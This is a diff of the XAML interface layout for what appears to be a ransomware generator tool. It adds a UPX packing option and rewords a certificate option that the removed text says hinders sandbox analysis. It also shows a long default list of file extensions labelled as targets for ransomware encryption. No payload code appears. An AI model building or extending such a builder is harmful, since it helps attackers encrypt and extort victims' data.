@@ -36,11 +36,18 @@
                 <CheckBox x:Name="chk_sign" Content="Self-signed certificate" Height="20" Width="191" HorizontalAlignment="Left" FontSize="16">
                     <CheckBox.ToolTip>
                         <ToolTip>
-                            <TextBlock Text="Slows down and hinders running in the sandbox"/>
+                            <TextBlock Text="Insert untrusted signing certificate"/>
                         </ToolTip>
                     </CheckBox.ToolTip>
                 </CheckBox>
-                <Label x:Name="lbl_open_source" Content="open source repository" Height="27" Width="190" FontFamily="Consolas" RenderTransformOrigin="0.486,0.993" FontSize="14" MouseDown="Lbl_open_source_MouseDown">
+                <CheckBox x:Name="chk_upx" Content="UPX compression" Height="20" Width="191" HorizontalAlignment="Left" FontSize="16" Checked="chk_upx_Checked">
+                    <CheckBox.ToolTip>
+                        <ToolTip>
+                            <TextBlock Text="Use upx to compress programs&#x0a;UPX.exe needs to be placed in the program directory"/>
+                        </ToolTip>
+                    </CheckBox.ToolTip>
+                </CheckBox>
+                <Label x:Name="lbl_open_source" Content="open source repository" Height="38" Width="205" FontFamily="Consolas" RenderTransformOrigin="0.486,0.993" FontSize="16" MouseDown="Lbl_open_source_MouseDown" Margin="0,40,0,0">
                     <Label.Style>
                         <Style TargetType="Label">
                             <Setter Property="Foreground" Value="#FF0A3C00"/>
@@ -68,7 +75,7 @@
                     <RowDefinition Height="10*"/>
                     <RowDefinition Height="72.806"/>
                 </Grid.RowDefinitions>
-                <RadioButton x:Name="rdb_cs" Content="C#" HorizontalAlignment="Left" Height="21" Margin="28,-2,0,0" VerticalAlignment="Top" Width="129" IsChecked="False" Checked="Rdb_cs_Checked" Loaded="Rdb_cs_Loaded">
+                <RadioButton x:Name="rdb_cs" Content="C#" HorizontalAlignment="Left" Height="21" Margin="28,2,0,0" VerticalAlignment="Top" Width="129" IsChecked="False" Checked="Rdb_cs_Checked" Loaded="Rdb_cs_Loaded">
                     <RadioButton.ToolTip>
                         <ToolTip>
                             <TextBlock Text="Use C# language (csc.exe)"/>
@@ -105,12 +112,12 @@
                     </TextBox.ToolTip>
                 </TextBox>
                 <TextBox x:Name="tbox_suffix_list" ScrollViewer.HorizontalScrollBarVisibility="Disabled" ScrollViewer.VerticalScrollBarVisibility="Auto" HorizontalAlignment="Center" Height="55" Margin="0,9,0,0" TextWrapping="Wrap" Text=".docb,.docm,.dot,.dotm,.dotx,.xlsm,.xlsb,.xlw,.xlt,.xlm,.xlc,.xltx,.xlt.m,.pptm,.pot,.pps,.ppsm,.ppsx,.ppam,.potx,.potm,.edb,.hwp,.602,.sxi,.sti,.sldx,.sldm,.sldm,.vdi,.vmdk,.vmx,.gpg,.aes,.arc,.paq,.bz2,.tbk,.bak,.tar,.tgz,.gz,.7z,.rar ,.zip,.backup,.iso,.vcd,.bmp,.png,.gif,.raw,.cgm,.tif,.tiff,.nef,.psd,.ai,.svg,.djvu,.m4u,.m3u,.mid,.wma,.flv,.3g2,.mkv ,.3gp,.mp4,.mov,.avi,.asf,.mpeg,.vob,.mpg,.wmv,.fla,.swf,.wav,.mp3,.sh,.class,.jar,.java,.rb,.asp,.php,.jsp,.brd,.sch,.dch,.dip,.pl,.vb,.vbs,.ps1,.bat,.cmd,.js,.asm,.h,.pas,.cpp,.c,.cs,.suo,.sln,.ldf,.mdf,.ibd,.myi,.myd,.frm,.odb,.dbf,.db,.mdb,.accdb,.sql,.sqlitedb,.sqlite3,.asc,.lay6,.lay,.mml,.sxm,.otg,.odg,.uop,.std,.sxd,.otp,.odp,.wb2,.slk,.dif,.stc,.sxc,.ots,.ods,.3dm,.max,.3ds,.uot,.stw,.sxw,.ott,.odt,.pem,.p12,.csr,.crt,.key,.pfx" VerticalAlignment="Top" Width="414" FontSize="18" Grid.Row="1" Grid.RowSpan="2" FontFamily="Consolas">
-                        <TextBox.ToolTip>
-                            <ToolTip>
-                                <TextBlock Text="List of suffixes encrypted by ransomware"/>
-                            </ToolTip>
-                        </TextBox.ToolTip>
-                    </TextBox>
+                    <TextBox.ToolTip>
+                        <ToolTip>
+                            <TextBlock Text="List of suffixes encrypted by ransomware"/>
+                        </ToolTip>
+                    </TextBox.ToolTip>
+                </TextBox>
             </Grid>
         </GroupBox>
         <Button x:Name="btn_generate" Content="GENERATE" HorizontalAlignment="Left" Margin="10,200,0,0" Width="693" FontFamily="Arial Black" FontSize="36" Height="112" VerticalAlignment="Top" Grid.ColumnSpan="2" Click="Btn_generate_Click"/>
